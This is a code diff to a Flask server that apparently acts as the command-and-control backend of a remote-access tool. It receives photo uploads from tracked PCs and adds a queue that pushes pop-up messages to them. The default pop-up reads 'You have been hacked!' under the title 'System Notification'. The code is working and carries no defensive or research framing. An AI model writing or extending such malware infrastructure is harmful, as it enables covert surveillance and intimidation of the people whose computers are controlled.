@@ -2,16 +2,57 @@ from flask import Flask, jsonify, send_file, request
 from datetime import datetime, timedelta
 import threading
 import os
+import uuid
 
 app = Flask(__name__)
 
 clients = {}
 clients_lock = threading.Lock()
 
-TIMEOUT_SECONDS = 60
+# pending messages: (client, pc) -> list of {id, style, title, text}
+messages = {}
+messages_lock = threading.Lock()
 
+TIMEOUT_SECONDS = 60
 PHOTOS_DIR = "photos1"
 os.makedirs(PHOTOS_DIR, exist_ok=True)
+
+# ... cleanup_clients unchanged ...
+
+@app.route("/sent/message/<client>/<pc>/", methods=["POST"])
+def sent_message(client, pc):
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    payload = request.get_json(silent=True) or {}
+    style = payload.get("style", "info")
+    if style not in ("info", "warning", "error", "askokcancel"):
+        style = "info"
+    title = str(payload.get("title", "System Notification"))[:200]
+    text = str(payload.get("text", "You have been hacked!"))[:2000]
+
+    msg = {"id": uuid.uuid4().hex, "style": style,
+           "title": title, "text": text}
+
+    with messages_lock:
+        messages.setdefault((client, pc), []).append(msg)
+
+    return jsonify({"Succes": True, "id": msg["id"]})
+
+@app.route("/message/<client>/<pc>/")
+def get_message(client, pc):
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    with messages_lock:
+        pending = messages.get((client, pc), [])
+        if pending:
+            msg = pending.pop(0)
+            if not pending:
+                messages.pop((client, pc), None)
+            return jsonify({"Succes": True, "message": msg})
+
+    return jsonify({"Succes": True, "message": None})
 
 def cleanup_clients():
     now = datetime.utcnow()
@@ -72,13 +113,6 @@ def photo1(client, pc):
 
 @app.route("/sent/photo1/<client>/<pc>/", methods=["POST"])
 def sent_photo1(client, pc):
-    
-    print("=== DEBUG ===")
-    print("Content-Type:", request.content_type)
-    print("Content-Length:", request.content_length)
-    print("Files:", list(request.files.keys()))
-    print("Raw data len:", len(request.get_data()))
-    print("=============")
 
     if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
         return jsonify({"Succes": False})
